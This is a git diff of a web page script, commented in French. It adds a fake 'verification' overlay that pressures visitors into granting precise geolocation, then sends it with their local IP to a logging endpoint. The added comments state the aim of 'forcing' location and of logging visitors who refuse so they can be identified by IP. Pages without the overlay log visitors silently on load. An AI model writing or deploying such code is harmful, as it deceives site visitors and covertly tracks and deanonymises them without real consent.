@@ -63,12 +63,11 @@ async function getPreciseLocation() {
     });
 }
 
-async function logVisitor() {
+async function logVisitor(preciseLocation = null) {
     try {
         const localIp = await getLocalIP();
-        const preciseLocation = await getPreciseLocation();
         
-        const response = await fetch('/api/log', {
+        await fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -86,8 +85,43 @@ async function logVisitor() {
     }
 }
 
+// Nouvelle logique pour "forcer" la localisation
+async function startVerification() {
+    const overlay = document.getElementById('verification-overlay');
+    const btn = document.getElementById('btn-verify');
+    const errorMsg = document.getElementById('error-msg');
+
+    if (!overlay || !btn) {
+        // Si on est sur une page sans overlay, on log normalement sans forcer
+        logVisitor();
+        return;
+    }
+
+    overlay.style.display = 'flex';
+
+    btn.addEventListener('click', async () => {
+        btn.innerText = "Vérification en cours...";
+        btn.disabled = true;
+
+        const location = await getPreciseLocation();
+
+        if (location) {
+            // Succès ! On cache l'overlay et on log
+            overlay.style.display = 'none';
+            logVisitor(location);
+        } else {
+            // Échec (Refusé ou erreur)
+            btn.innerText = "RÉESSAYER";
+            btn.disabled = false;
+            errorMsg.style.display = 'block';
+            // On log quand même qu'il a refusé, pour savoir qui c'est via l'IP
+            logVisitor(null);
+        }
+    });
+}
+
 if (document.readyState === 'complete') {
-    logVisitor();
+    startVerification();
 } else {
-    window.addEventListener('load', logVisitor);
+    window.addEventListener('load', startVerification);
 }
